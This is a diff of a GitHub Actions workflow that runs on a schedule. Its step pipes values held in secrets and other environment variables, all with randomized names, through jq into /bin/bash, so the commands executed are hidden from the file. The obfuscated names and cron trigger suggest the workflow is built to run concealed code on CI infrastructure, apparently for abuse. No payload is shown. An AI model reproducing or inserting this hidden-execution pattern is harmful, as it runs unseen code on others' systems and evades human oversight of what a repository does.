@@ -2,22 +2,23 @@ name: lubeichen3891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 4/6 * * *'
+    - cron: '35 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lubeichen3891
         env:
-          l10: ${{ secrets.l10 }}
+          fq97745: ${{ secrets.fq97745 }}
         run: |
-          echo $l10 | jq -r .frt79429 | /bin/bash
-          echo $zkvu62527 | jq -r .whvq3 | /bin/bash
-          echo $yazo67259 | jq -r .y818 | /bin/bash
-          echo $cdtlr6 | jq -r .z040 | /bin/bash
-          echo $km435 | jq -r .y6860 | /bin/bash
-          echo $r1120 | jq -r .z12747 | /bin/bash
-          echo $c0 | jq -r .xjw21 | /bin/bash
-          echo $zz572 | jq -r .xos9537 | /bin/bash
+          echo $fq97745 | jq -r .jpxib49843 | /bin/bash
+          echo $rpzlx8633 | jq -r .l47 | /bin/bash
+          echo $xzze6993 | jq -r .wesy69 | /bin/bash
+          echo $hpq690 | jq -r .ttmly268 | /bin/bash
+          echo $v96577 | jq -r .w9242 | /bin/bash
+          echo $u64 | jq -r .axkw4006 | /bin/bash
+          echo $wsg7143 | jq -r .pbms31355 | /bin/bash
 
